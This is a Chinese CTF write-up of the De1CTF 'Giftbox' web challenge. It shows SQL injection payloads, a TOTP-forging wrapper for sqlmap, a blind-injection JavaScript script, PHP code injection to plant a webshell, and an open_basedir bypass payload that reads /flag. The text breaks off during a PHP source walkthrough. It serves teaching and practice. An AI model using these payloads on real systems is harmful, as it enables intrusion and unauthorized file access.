# DelCTF web之Giftbox题解
## 0x1 前言
因为自己太菜了，当时就没怎么看题目，然后坐等wp了来复盘一波，感觉这次的国际赛的web其实难度并不是很深，但是对一个ctfer的基本功要求很高，包括一些知识面、编写脚本以及fuzz的能力，就是一种综合题的即视感。我分享下当时自己的做题过程，希望对一些新手能有所启发。
## 0x2 题目介绍
相关环境(我做题的时候还在开放着)
    送给小蛮腰的礼物，她是一位美丽的姑娘。
    A gift for Canton Tower, a pretty girl.
    http://207.148.79.106:8090 (sg-sgp)
    http://45.76.193.153:8090 (jp-tky)
    http://222.85.25.41:8090 (cn-zgz)
    http://136.244.114.21:8090 (fr-par)
    http://66.42.96.82:8090 (us-lax)
## 0x3 做题过程分析
ma下直接搜索下关键字命令找到tamper的路径:
`command: locate "*multiplespaces*"`
然后进入里面打开修改为我们的注入语句就可以了
这个注入点没有任何过滤，但是需要注意空格的话会被识别为命令的分隔符，我当时就是被这个坑了一波。
怎么测试注入点的呢?
以后对于mysql可以使用这个payload(完美避开坑点):
`login xadmin'or(1)# 1234`
`login xadmin'or(0)# 1234`
那么我们抓包看看，能不能丢进sqlmap里面直接跑，如果不能再fuzz规则过滤绕过( 本菜ctf的做题思路)
结果经过测试发现totp参数应该类似个token的东西,果断查看前端代码看下怎么构造的。
直接搜索关键字`totp`
这些时候估计大佬们一眼看穿了考点，我比较菜，所以google了一下这个东西。
关于这个算法简单理解下
> totp是基于时间的一次性密码算法。
>
> 根据预共享的密钥与当前时间计算的一次性密码算法。
>
> 要求：
>
> 1) 令牌与服务器之间必须时钟同步；
>
> 2) 令牌与服务器之间必须共享密钥；
>
> 3) 令牌与服务器之间必须使用相同的时间步长
>
> 算法：
>
> TOTP =Truncate(HMAC-SHA-1(K, (T - T0) / X)) X就是间隔的意思。
这样我们可以得到什么信息呢。
首先这是个密码算法，然后它是共享密钥的。 也就是加密过程就算语言不同，运算过程都是一样的。
那么这个程序后端是怎么校验`totp`,这个时候可以看下作者本意的提示(其实看不看都无所谓！可以分析客户端js得到配置的参数)
我们可以直接分析js获取到参数:
可以看到js的加载顺序如下,`new ToTp`是在`main.js`调用的，所以大概就知道TOTP的初始化位置了,跟进看看。
重点是`totp.min.js` 出处是: (简单读下，很容易就发现这个算法了)
很明显缺省值就是5嘛。因为这个题目作者可能为了降低难度，所以没有任何过滤，这样我们难道还
闲的没事去写脚本注入吗，直接调用sqlmap就好了。
直接`flask`起个服务,转发给sqlmap跑就好了，
重点是配置好`totp = pyotp.TOTP('GAXG24JTMZXGKZBU', 8, interval=5)`也就是长度为8，间隔为5
然后sqlmap跑起来就好了
获取到密码:`hint{G1ve_u_hi33en_C0mm3nd-sh0w_hiiintttt_23333}`
然后根据他的提示尝试下hidden command: `sh0w_hiiintttt_23333`
我们再次`ls`查看有个用法,然后`cat`一下
    De1ta Nuclear Missile Controlling System 这个系统贼有意思叫做核弹控制系统
其实看到`eval` `code` 就可以猜到是考代码注入了。我们先随便试试看看
看到这个，当时直接试试了下`targeting a a";phpinfo();//`然后发现过滤，那么我们可以fuzz下
可以看到 0(变量名称) 1(变量内容) 位置分别过滤字符
其实这个因为php存在`variable variables`语法，双引号也可以执行代码。
[从一道题讲PHP复杂变量](https://xz.aliyun.com/t/4785) 可以看看这篇文章
这里我直接给出payload:
然后直接写一句话就好了,密码为x,后面就是绕过`open_basedir`的问题了
关于具体的payload可以看我写的完整exp脚本。
### 0x3.1 前端ajax注入
这里我贴一下@一叶飘零师傅写的脚本,原理其实差不多，就是`script`的语言改变了。
    async function ajax(username) {
        return new Promise(function (resolve, reject) {
            let ajaxSetting = {
                url: host + `/shell.php?a=login%20${encodeURIComponent(username)}%201&validthis=1&totp=${new TOTP("GAXG24JTMZXGKZBU",8).genOTP()}`,
                type: "GET",
                dataType: 'json',
                success: function (response) {
                    resolve(response);
                },
                error: function () {
                    reject("请求失败");
                }
            }
            $.ajax(ajaxSetting);
        });
    }
    async function test(username) {
        const res = await ajax(username);
        return res.message
    }
    async function blind() {
        let ret = ""
        for(let j = 1; j  **同步和异步的理解**
> ：当我们发出了请求，并不会等待响应结果，而是会继续执行后面的代码，响应结果的处理在之后的事件循环中解决。那么同步的意思，就是等结果出来之后，代码才会继续往下执行。
>
>
> 我们可以用一个两人问答的场景来比喻异步与同步。A向B问了一个问题之后，不等待B的回答，接着问下一个问题，这是异步。A向B问了一个问题之后，然后就笑呵呵的等着B回答，B回答了之后他才会接着问下一个问题，这是同步。
分析这个脚本的构成:
    async function blind() # 主函数，fuzz字符
    async function test(username) # 等待异步
    async function ajax(username) # 发起请求
编写这个脚本主要就是处理好通过await阻塞处理异步的问题。因为javascript函数默认都是异步的。
### 0x3.2 简单分析 Bypass open_basedir
我们通过直接利用命令: `x=echo(file_get_contens('/flag'));`
会发现没有回显,这个时候我们需要考虑下是不是权限的问题还是做了目录限制尝试读取下`phpinfo();`
首先搜索下:`open_basedir`
可以发现正是出题人对应的设置:
这个题目其实按照逻辑来说,`disable_function`限制了执行命令.
然后
PHP连接方式是:`apche2-module`,所以基本不用考虑什么PHP-FPM绕过命令执行问题,而且一般ctf比赛
`flag`的权限都是任何人可读(`chmod 644 /flag`),又可以很明显看到了`open_basedir: /app:/sandbox`
所以考点就很清晰了嘛,就是绕过`open_basedir`
那么怎么绕过`open_basedir`呢,其实在4月份的时候就有大神在twitter发出来了方法,在p神的小秘圈也有，虽然我很少打ctf，但是对于一些有趣的技术探讨我还是会去了解一下的，但是没深究原理，趁着这次做题的机会，在网上看了一些文章，感觉对于像我这种菜鸡来说还是挺难懂的，所以我取其精华，自己debug一下php源代码，跟踪一下关键流程。
首先给出绕过的`payload`,借用twitter大神的图
简化下`payload`:
    chdir('css');ini_set('open_basedir','..');chdir('..');chdir('..');chdir('..');chdir('..');ini_set('open_basedir','/');echo(file_get_contents('/flag'));
代码意思就是,先改变当前文件(`/var/www/html/`)所处的路径为(`/var/www/html/css`),查阅官方介绍下这个配置函数`ini_set`的一些信息如下:
效果看下:
> ### Description
>
> ini_set ( string `$varname` , string `$newvalue` ) : string
>
> Sets the value of the given configuration option. The configuration option
> will keep this new value during the script's execution, and will be restored
> at the script's ending.
>
> 简单翻译下就是这个可以修改php script运行时对应的php.ini的一些配置
`ini_set`自身有保护措施的,举个例子
这个本身就是`open_basedir`发挥的作用，用来限制php script能操作的目录。
其实这个漏洞简单来讲就是相对路径没处理好，让他不断改变目录结构然后验证的时候被绕过。
一开始我的想法是这样的，
是不行的哦,其实要理解为什么，还是得从底层分析下，了解下`chdir`设置什么绕过了php对`open_basedir`的判断,关于mac怎么调试php源码
可以参考我之前写的一篇文章[初探php扩展之MAC下环境配置篇](https://xz.aliyun.com/t/4687)
再次安利一本书:
[PHP7内核剖析](https://www.kancloud.cn/nickbai/php7/363315)
我debug的php版本为:
> PHP 7.1.8 (cli) (built: Aug 8 2019 22:52:48) ( NTS DEBUG )  
>  Copyright (c) 1997-2017 The PHP Group  
>  Zend Engine v3.1.0, Copyright (c) 1998-2017 Zend Technologies
php src的目录结构前面文章已经说过了,我们重点关注`ext`目录即可
>
> ext目录下放的是php里面的扩展，包括我们经常使用的一些核心函数(json_encode,json_decode)同时也包括mysqli、pdo等核心类
    xq17@localhost  ~/Desktop/个人学习/php扩展学习/debugphp/php-7.1.8/ext  tree -L 1
    .
    ├── bcmath
    ├── bz2
    ├── calendar
    ├── com_dotnet
    ├── ctype
    ├── curl
    ├── date
    ├── dba
    ├── dom
    ├── enchant
    ├── exif
    ├── ext_skel
    ├── ext_skel_win32.php
    ├── fileinfo
    ├── filter
    ├── ftp
    ├── gd
    ├── gettext
    ├── gmp
    ├── hash
    ├── iconv
    ├── imap
    ├── interbase
    ├── intl
    ├── json
    ├── ldap
    ├── libxml
    ├── mbstring
    ├── mcrypt
    ├── mysqli
    ├── mysqlnd
    ├── oci8
    ├── odbc
    ├── opcache
    ├── openssl
    ├── pcntl
    ├── pcre
    ├── pdo
    ├── pdo_dblib
    ├── pdo_firebird
    ├── pdo_mysql
    ├── pdo_oci
    ├── pdo_odbc
    ├── pdo_pgsql
    ├── pdo_sqlite
    ├── pgsql